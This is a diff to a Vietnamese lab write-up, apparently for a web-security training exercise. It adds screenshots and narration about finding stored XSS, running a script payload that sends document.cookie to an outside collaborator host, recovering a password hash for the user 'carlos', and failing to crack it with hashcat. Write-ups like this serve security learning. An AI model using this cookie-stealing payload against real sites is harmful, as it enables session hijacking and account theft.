@@ -215,6 +215,8 @@ Sau 1 lúc thì tôi nhận ra phải xóa cái session kia đi vì khi còn ses
 
 ![image](https://github.com/user-attachments/assets/7e6af92b-fa66-4519-b5d7-e9328c291de1)
 
+![image](https://github.com/user-attachments/assets/20ccffc6-aaff-45d6-a748-d182fde63da8)
+
 Sau đấy tôi mới nhận ra là burp có hỗ trợ chứ không cần phải code tay để tạo mấy cái hash với encode kia....
 
 ![image](https://github.com/user-attachments/assets/738b1cd7-9007-46d3-b4f5-a0dfaab22ca4)
@@ -222,13 +224,42 @@ Sau đấy tôi mới nhận ra là burp có hỗ trợ chứ không cần phả
 <h1>---------------------------------------------------------</h1>
 <br>
 
+![image](https://github.com/user-attachments/assets/44cb89b6-e312-4bee-adf1-8e01c51aac4f)
 
+![image](https://github.com/user-attachments/assets/1d75cdfa-e4e2-4ff5-be18-25ad2dc040f8)
 
+Vẫn như trước thôi, tôi nghĩ chắc lần này có biện pháp bảo vệ brute cookie nên tôi lười, chả thèm brute, đi test thử xss đã
 
+![image](https://github.com/user-attachments/assets/e8a9231f-9112-430b-9e91-ab3a98b8e5cd)
 
+![image](https://github.com/user-attachments/assets/4fcd3d89-ee95-4f7b-82ff-b3d8ca2b71b9)
 
+Hoạt động ngon rồi nên cho nó chạy payload `<script>new Image().src = "https://f1hto37uq1fakjzjnlnx4sevfmld93xs.oastify.com/?cookie=" + document.cookie;</script>`
 
+![image](https://github.com/user-attachments/assets/52ee17b9-f885-41aa-8ceb-cf3c381b5504)
 
+Bắt được rồi, ngon
+
+![image](https://github.com/user-attachments/assets/d845adc6-e12c-43b6-8d61-aff02e686eb0)
+
+![image](https://github.com/user-attachments/assets/54ea4d76-a431-4dcd-96eb-3f563ac62df2)
+
+`carlos:26323c16d5f4dabff3bb136f2460a943`, không hiểu sao tôi dùng hashcat mà không có ra 
+
+![image](https://github.com/user-attachments/assets/8f5bdf35-8875-4d23-862f-2e92793d92cb)
+
+Bảo sao....
+
+![image](https://github.com/user-attachments/assets/29f937f7-436e-42d8-be59-ff22c1c7b3e2)
+
+![image](https://github.com/user-attachments/assets/efdc6a37-2d96-41b6-b090-7538810b0b24)
+
+![image](https://github.com/user-attachments/assets/6ec7fde1-c1ce-41ae-a92a-de7601af90a3)
+
+Vậy là password không có trong cái list kia, nếu ban nãy tôi brute thì không thể ra được
+
+<h1>---------------------------------------------------------</h1>
+<br>
 
 
 
